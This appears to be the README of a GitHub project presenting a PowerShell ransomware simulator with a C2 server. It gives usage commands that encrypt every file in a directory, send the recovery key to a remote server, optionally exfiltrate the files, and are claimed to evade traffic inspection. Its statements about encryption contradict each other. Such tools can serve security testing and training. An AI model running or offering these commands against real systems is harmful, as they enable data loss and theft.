# Sproinks
**Sproinks** is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP. 

All communication between the two elements is encrypted or encoded so as to be undetected by traffic inspection mechanisms, although at no time is HTTPS used at any time.

# Requirements
- PowerShell 4.0 or greater


# Download
It is recommended to clone the complete repository or download the zip file.
You can do this by running the following command:
```
git clone https://github.com/barro77514/sproinks
```


# Usage
```

 Info:  This tool helps you simulate encryption process of a
        generic ransomware in PowerShell with C2 capabilities

 Usage: .\Sproinks.ps1 -e Directory -s C2Server -p C2Port
          Encrypt all files & sends recovery key to C2Server
          Use -x to exfiltrate and decrypt files on C2Server

        .\Sproinks.ps1 -d Directory -k RecoveryKey
          Decrypt all files with recovery key string

 Warning: All info will be sent to the C2Server without any encryption
          You need previously generated recovery key to retrieve files

```

